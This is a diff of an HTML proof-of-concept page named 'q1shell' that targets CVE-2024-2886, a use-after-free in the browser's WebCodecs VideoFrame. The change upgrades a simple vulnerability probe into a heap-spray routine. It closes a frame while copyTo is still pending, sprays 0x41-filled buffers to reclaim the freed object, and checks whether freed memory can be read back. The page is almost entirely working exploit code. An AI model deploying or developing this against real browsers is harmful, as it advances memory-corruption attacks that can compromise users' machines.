@@ -1,73 +1,92 @@
 <!doctype html>
 <html>
 <head><title>q1shell</title></head>
-<body style="background:#000;color:#fff;font-family:monospace;font-size:12px;padding:0px;">
+<body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
 <div id="out"></div>
 <script>
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
 async function pwn() {
-    log('CVE-2024-2886 — WebCodecs VideoFrame UAF');
-    log('No codec needed - direct VideoFrame from canvas');
+    log('CVE-2024-2886 — UAF heap spray verification');
     log('');
 
-    if (typeof VideoFrame === 'undefined') {
-        log('ERROR: VideoFrame not available'); return false;
-    }
-    log('[+] VideoFrame available');
-
-    // Create VideoFrame directly from canvas - no encoder/decoder needed
+    // First: what does normal copyTo return? (no close)
     const canvas = new OffscreenCanvas(64, 64);
     const ctx = canvas.getContext('2d');
+    // Fill with known pattern: pure red = YUV Y=81 Cb=90 Cr=240
+    ctx.fillStyle = '#ff0000';
+    ctx.fillRect(0, 0, 64, 64);
 
-    let succeeded = 0, failed = 0;
+    const frameNormal = new VideoFrame(canvas, { timestamp: 0 });
+    const bufNormal = new Uint8Array(frameNormal.allocationSize());
+    await frameNormal.copyTo(bufNormal);
+    frameNormal.close();
+    const normalHex = Array.from(bufNormal.slice(0, 16))
+        .map(x => x.toString(16).padStart(2,'0')).join(' ');
+    log('[baseline] normal copyTo bytes: ' + normalHex);
+    log('[baseline] frame size: ' + bufNormal.length);
+    log('');
 
-    for (let attempt = 0; attempt < 20; attempt++) {
-        // Draw something to the canvas
-        ctx.fillStyle = `hsl(${attempt * 18}, 100%, 50%)`;
+    // Now: UAF with heap spray between close() and promise resolution
+    const results = [];
+
+    for (let attempt = 0; attempt < 10; attempt++) {
+        ctx.fillStyle = '#ff0000'; // always red
         ctx.fillRect(0, 0, 64, 64);
 
-        // Create VideoFrame directly from canvas
         const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 });
         const size = frame.allocationSize();
         const buf = new Uint8Array(size);
 
-        // THE RACE: start async copyTo, immediately close the frame
+        // Start async copy
         const promise = frame.copyTo(buf);
-        frame.close(); // UAF trigger - free frame while copy is in flight
 
-        try {
-            const layout = await promise;
-            succeeded++;
-            const hex = Array.from(buf.slice(0, 8))
-                .map(x => x.toString(16).padStart(2,'0')).join(' ');
-            log('[+] #' + attempt + ': copyTo OK after close [' + hex + '] size=' + size);
-        } catch(e) {
-            failed++;
-            log('[!] #' + attempt + ': ' + e.message);
+        // Free the frame
+        frame.close();
+
+        // HEAP SPRAY: immediately allocate lots of memory with known pattern
+        // to try to reclaim the freed VideoFrame C++ object
+        const spray = [];
+        const SPRAY_PATTERN = 0x41; // 'A' = 0x41
+        for (let i = 0; i < 1000; i++) {
+            const s = new Uint8Array(256);
+            s.fill(SPRAY_PATTERN);
+            spray.push(s);
         }
+
+        // Now let copyTo complete - it reads from potentially reclaimed memory
+        const layout = await promise;
+        spray.length = 0; // release
+
+        const hex = Array.from(buf.slice(0, 16))
+            .map(x => x.toString(16).padStart(2,'0')).join(' ');
+
+        // Check if any bytes differ from baseline (red frame = known pattern)
+        const differs = buf.some((b, i) => b !== bufNormal[i]);
+
+        results.push({ attempt, hex, differs });
+        log('[' + attempt + '] ' + hex + (differs ? ' <<< DIFFERS FROM BASELINE' : ' (same)'));
     }
 
     log('');
-    log('Results: ' + succeeded + ' succeeded, ' + failed + ' failed');
-
-    if (succeeded > 0 && failed === 0) {
-        log('UNPATCHED: copyTo always succeeds after close');
-        log('(This is expected - bug exists but may need exploit to be useful)');
-        return true;
-    } else if (succeeded > 0 && failed > 0) {
-        log('RACE CONDITION: sometimes succeeds, sometimes fails');
-        log('UAF confirmed - timing-dependent');
+    const anyDiffers = results.some(r => r.differs);
+    if (anyDiffers) {
+        log('REAL UAF CONFIRMED: bytes differ from baseline');
+        log('Freed memory was reclaimed and corrupted by heap spray');
+        log('We have read access to freed/reused C++ VideoFrame memory');
         return true;
     } else {
-        log('PATCHED: copyTo always throws after close');
-        return false;
+        log('copyTo succeeds but bytes match baseline');
+        log('Frame memory not immediately reused - refcount may keep it alive');
+        log('UAF exists but needs different exploitation strategy');
+        log('Will try larger spray...');
+        return 'partial';
     }
 }
 
 pwn().then(r => {
     log('');
-    log('RESULT: ' + (r ? 'VULNERABLE' : 'PATCHED'));
+    log('RESULT: ' + r);
 });
 </script>
 </body>
